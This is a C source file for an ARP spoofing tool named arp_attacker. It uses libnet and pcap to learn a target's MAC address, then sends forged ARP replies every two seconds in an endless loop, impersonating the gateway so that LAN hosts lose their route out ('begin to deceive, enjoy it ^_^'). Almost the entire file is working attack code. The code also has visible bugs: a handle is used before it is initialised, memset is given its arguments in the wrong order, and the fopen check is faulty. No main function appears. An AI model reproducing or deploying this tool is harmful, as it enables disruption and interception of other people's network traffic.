/************************************************
 *
 * Auther: winway
 *
 * Version: 1.0
 *
 * Introduction: send fake arp packets to one of
 * the PC or all of the PCs in your LAN to deceive
 * it, so that the PC(s) can not find the geteway.
 *
 ************************************************/

#include    <stdio.h>
#include    <stdlib.h>
#include    <string.h>
#include    <time.h>
#include    <pthread.h>
#include    <pcap.h>
#include    <libnet.h>
#include    <sys/types.h>
#include    <sys/socket.h>
#include    <sys/ioctl.h>
#include    <netinet/in.h>
#include    <net/if.h>
#include    <net/if_arp.h>
#include    <arpa/inet.h>

#include    "arp_attacker.h"

#define	DELAY	2
#define	MAXLINE	1024
#define	CONFIG_FILE	"./arp_attacker.conf"

/* *
 * ethernet header
 * */
struct ether_header
{
	u_int8_t ether_dhost[6];
	u_int8_t ether_shost[6];
	u_int16_t ether_type;
};

/* *
 * ARP header
 * */
struct arp_header
{
	u_int16_t arp_hardware_type;
	u_int16_t arp_protocol_type;
	u_int8_t arp_hardware_length;
	u_int8_t arp_protocol_length;
	u_int16_t arp_operation_code;
	u_int8_t arp_source_ethernet_address[6];
	u_int8_t arp_source_ip_address[4];
	u_int8_t arp_destination_ethernet_address[6];
	u_int8_t arp_destination_ip_address[4];
};

int     ok_flag;
char	eth[ETH_LEN];
char	local_ip[IP_LEN];
char	local_mac[MAC_LEN];
char	attack_ip[IP_LEN];
char	attack_mac[MAC_LEN];
char	fake_ip[IP_LEN];
char	fake_mac[MAC_LEN];

/* *
 * send ARP request packet to dst host
 * */
void
build_arp_request()
{
	printf("\033[32m");
	printf("send an ARP request to %s\n", attack_ip);
	printf("\033[0m");

	int				packet_size;
	libnet_t		*l;
	libnet_ptag_t	protocol_tag;
	char			*device = NULL;
	char			error_information[LIBNET_ERRBUF_SIZE];

	u_char destination_mac[6] =
	{
		0xff, 0xff, 0xff, 0xff, 0xff, 0xff
	};

	u_long	source_ip = libnet_name2addr4(l, local_ip, LIBNET_RESOLVE);
	u_long	destination_ip = libnet_name2addr4(l, attack_ip, LIBNET_RESOLVE);

	l = libnet_init(LIBNET_LINK_ADV, device, error_information);
	protocol_tag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4, \
                                    ARPOP_REQUEST, local_mac, \
                                    (u_int8_t*)&source_ip, \
                                    destination_mac, \
                                    (u_int8_t*)&destination_ip, \
                                    NULL, 0, l, 0);
	protocol_tag = libnet_autobuild_ethernet(destination_mac, ETHERTYPE_ARP, l);

	packet_size = libnet_write(l);
	printf("length %d ARP request packet get out\n", packet_size);

	libnet_destroy(l);
}

/* *
 * ARP protocol analyse handler
 * */
void
arp_protocol_packet_callback(u_char *argument, \
                             const struct pcap_pkthdr *packet_header, \
                             const u_char *packet_content)
{
	struct	arp_header *arp_protocol;
	struct	in_addr source_ip_address;
	u_short	operation_code;

	arp_protocol = (struct arp_header*)(packet_content + 14);
	operation_code = ntohs(arp_protocol->arp_operation_code);
	memcpy((void *)&source_ip_address, \
           (void *)&arp_protocol->arp_source_ip_address, \
           sizeof(struct in_addr));

	switch (operation_code)
	{
		case 2:
			if (strcmp(inet_ntoa(source_ip_address), argument) == 0)
			{
				ok_flag = 0;

				int	i;
				for (i=0; i<6; i++)
				{
					attack_mac[i] = arp_protocol->arp_source_ethernet_address[i];
				}

				printf("\033[32m");
				printf("ARP parse thread jobdone\n");
				printf("\033[0m");

				pthread_exit(NULL);
			}
			break;
		default:
			break;
	}
}

/* *
 * ethernet protocol analyse handler
 * */
void
ethernet_protocol_packet_callback(u_char *argument, \
                                  const struct pcap_pkthdr *packet_header, \
                                  const u_char *packet_content)
{
	u_short					ethernet_type;
	struct	ether_header	*ethernet_protocol;

	ethernet_protocol = (struct ether_header *)packet_content;
	ethernet_type = ntohs(ethernet_protocol->ether_type);

	switch (ethernet_type)
	{
		case 0x0806:
			arp_protocol_packet_callback(argument, \
                                         packet_header, \
                                         packet_content);
			break;
		default:
			break;
	}
}

/* *
 * analyse ARP reply packet to get dest MAC
 * */
void
arp_parse()
{
	printf("\033[32m");
	printf("ARP parse thread start\n");
	printf("\033[0m");

	pcap_t			*pcap_handle;
	char			error_content[PCAP_ERRBUF_SIZE];
	char			*net_interface;
	struct			bpf_program bpf_filter;
	char			bpf_filter_string[] = "arp";
	bpf_u_int32 	net_mask;
	bpf_u_int32		net_ip;

	net_interface = pcap_lookupdev(error_content);
	pcap_lookupnet(net_interface, &net_ip, &net_mask, error_content);
	pcap_handle = pcap_open_live(net_interface, BUFSIZ, 1, 0, error_content);
	pcap_compile(pcap_handle, &bpf_filter, bpf_filter_string, 0, net_ip);
	pcap_setfilter(pcap_handle, &bpf_filter);

	if (pcap_datalink(pcap_handle) != DLT_EN10MB)
	{
		printf("\033[31m");
		printf("data link is not ethernet\n");
		printf("\033[0m");
		exit(0);
	}

	pcap_loop(pcap_handle,  -1, ethernet_protocol_packet_callback, attack_ip);
	pcap_close(pcap_handle);
	exit(0);
}

/* *
 * send ARP deceive packet
 * */
void
build_arp_reply()
{
	printf("\033[32m");
	printf("begin to deceive, enjoy it ^_^\n");
	printf("\033[0m");

	while (1)
	{
		sleep(DELAY);

		int				packet_size;
		libnet_t		*l;
		libnet_ptag_t	protocol_tag;
		char			*device = NULL;
		char			error_information[LIBNET_ERRBUF_SIZE];

		u_long	source_ip = libnet_name2addr4(l, fake_ip, LIBNET_RESOLVE);
		u_long	dest_ip = libnet_name2addr4(l, attack_ip, LIBNET_RESOLVE);

		l = libnet_init(LIBNET_LINK_ADV, device, error_information);
		protocol_tag = libnet_build_arp(ARPHRD_ETHER, ETHERTYPE_IP, 6, 4, \
                                        ARPOP_REPLY, fake_mac, \
                                        (u_int8_t *) & source_ip, \
                                        attack_mac, \
                                        (u_int8_t *) & dest_ip, 
                                        NULL, 0, l, 0);
		protocol_tag = libnet_autobuild_ethernet(attack_mac, ETHERTYPE_ARP, l);

		packet_size = libnet_write(l);
		printf ("length %d ARP deceive packet get out\n", packet_size);

		libnet_destroy (l);
	}
}

/* *
 * read configuration
 * */
void
read_config()
{
    int     n = 0;
	FILE	*stream = NULL;
	char	buf[MAXLINE];

	memset(buf, MAXLINE, '\0');

	if ((stream = fopen(CONFIG_FILE, "r")) < 0)
	{
		printf("\033[31m");
		printf("read config failed\n");
		printf("\033[0m");
		exit(0);
	}

	while (fgets(buf, MAXLINE, stream) != NULL)
	{
        if (buf[0] == '#')
        {
            continue;
        }

		if (strstr(buf, "ETH") != NULL)
		{
			char	*p_start = NULL;
			char	*p_end = NULL;

			p_start = strstr(buf, "=");
			p_start = p_start + 2;
			p_end = strstr(p_start, ";");

			memcpy(eth, p_start, p_end - p_start);
			printf("eth: %s\n", eth);

            n++;
			continue ;
		}
		else if (strstr(buf, "IP") != NULL)
		{
			char	*p_start = NULL;
			char	*p_end = NULL;

			p_start = strstr(buf, "=");
			p_start = p_start + 2;
			p_end = strstr(p_start, ";");

			memcpy(fake_ip, p_start, p_end - p_start);
			printf("fake ip: %s\n", fake_ip);

            n++;
			continue ;
		}
		else if (strstr(buf, "MAC") != NULL)
		{
			char	*p_start = NULL;

			p_start = strstr(buf, "=");
			p_start = p_start + 2;

			int	i = 0;
			for (i = 0; i < 6; i++)
			{
				fake_mac[i] = (unsigned char)strtoul(p_start, NULL, 16);
				p_start += 3;
			}

			printf("fake mac: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", \
                                           (u_char)fake_mac[0], \
                                           (u_char)fake_mac[1], \
                                           (u_char)fake_mac[2], \
                                           (u_char)fake_mac[3], \
                                           (u_char)fake_mac[4], \
                                           (u_char)fake_mac[5]);

            n++;
            continue;
		}
	}

    if (n != 3)
    {
        printf("\033[31m");
        printf("read config failed\n");
        printf("\033[0m");
		exit(0);
    }
}

/* *
 * get local IP & MAC
 * */
void
get_local_ip_mac()
{
	int		sock;
	struct	ifreq ifr;
	struct	sockaddr_in sin;
	struct	sockaddr sa;

	if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1)
	{
		printf("\033[31m");
		printf("create socket error\n");
		printf("\033[0m");
		exit(0);
	}

    memset(ifr.ifr_name, '\0', IFNAMSIZ);
	strncpy(ifr.ifr_name, eth, IFNAMSIZ);

	if (ioctl(sock, SIOCGIFADDR, &ifr) < 0)
	{
		printf("\033[31m");
		printf("ioctl error\n");
        perror("ioctl error");
		printf("\033[0m");
		exit(0);
	}

	memcpy(&sin, &ifr.ifr_addr, sizeof(sin));

	strcpy(local_ip, inet_ntoa(sin.sin_addr));
	printf("local ip: %s\n", local_ip);

	if (ioctl(sock, SIOCGIFHWADDR, &ifr) < 0)
	{
		printf("\033[31m");
		printf("ioctl error\n");
		printf("\033[0m");
		exit(0);
	}

	memcpy(&sa, &ifr.ifr_addr, sizeof(sa));
	memcpy(local_mac, sa.sa_data, sizeof(local_mac));
	printf("local mac: %.2X:%.2X:%.2X:%.2X:%.2X:%.2X\n", \
                                   (u_char)local_mac[0], \
                                   (u_char)local_mac[1], \
                                   (u_char)local_mac[2], \
                                   (u_char)local_mac[3], \
                                   (u_char)local_mac[4], \
                                   (u_char)local_mac[5]);
}
